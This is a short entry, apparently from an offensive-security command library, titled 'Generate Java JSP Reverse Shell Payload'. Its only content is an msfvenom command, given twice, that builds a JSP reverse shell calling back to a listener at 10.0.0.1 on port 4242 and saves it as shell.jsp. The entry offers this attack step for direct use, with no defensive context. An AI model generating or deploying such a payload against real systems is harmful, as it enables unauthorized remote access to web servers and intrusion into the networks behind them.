---
id: 208dadda-0ebd-4ac6-b8e2-4617aa814d2d
name: Generate Java JSP Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw
  > shell.jsp
output: null
created_at: '2023-04-06T03:56:24.923615+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Java JSP Reverse Shell Payload

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
```
